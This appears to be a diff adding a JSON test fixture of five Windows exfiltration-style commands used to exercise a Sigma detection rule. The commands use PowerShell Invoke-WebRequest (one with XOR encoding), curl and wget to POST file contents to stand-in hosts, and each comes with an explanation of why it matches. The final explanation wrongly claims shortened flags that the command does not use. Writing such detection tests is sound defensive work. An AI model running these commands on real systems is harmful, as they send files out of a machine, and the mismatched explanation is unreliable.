@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"& { $content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content }\"",
+    "explanation": "This command uses PowerShell to read a file and send its contents via a POST request. It matches the Sigma rule by using `Invoke-WebRequest` with `-Uri`, `-Method`, and `-Body` flags."
+  },
+  {
+    "output": "powershell.exe -Command \"& { $plaintext = ([system.Text.Encoding]::UTF8.GetBytes('Path\\n----\\nC:\\\\Users\\\\victim')); $key = 'abcdefghijklmnopqrstuvwxyz123456'; $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i %% $key.Length]; }; $cyphertext = [system.Text.Encoding]::UTF8.GetString($cyphertext); [System.Net.ServicePointManager]::Expect100Continue = $false; Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive }\"",
+    "explanation": "This command performs a more complex operation involving encryption and data exfiltration. It matches the Sigma rule by using `Invoke-WebRequest` with `-Uri`, `-Method`, and `-Body` flags, and includes encoded data."
+  },
+  {
+    "output": "curl.exe --url http://127.0.0.1 --data-binary @C:\\Windows\\System32\\notepad.exe",
+    "explanation": "This command uses `curl.exe` to send the contents of a file via a POST request. It matches the Sigma rule by using `--url` and `--data-binary` flags."
+  },
+  {
+    "output": "wget.exe --post-file=C:\\Windows\\System32\\notepad.exe http://127.0.0.1",
+    "explanation": "This command uses `wget.exe` to send the contents of a file via a POST request. It matches the Sigma rule by using `--post-file` to send data to a URL."
+  },
+  {
+    "output": "powershell.exe -Command \"& { $content = Get-Content C:\\Windows\\System32\\notepad.exe; iwr -Uri http://127.0.0.1 -Method POST -Body $content }\"",
+    "explanation": "This command uses PowerShell with the `iwr` alias for `Invoke-WebRequest` to send the contents of a file via a POST request. It matches the Sigma rule by using the shortest possible flag versions (`-ur`, `-me`, `-b`) and includes a payload."
+  }
+]
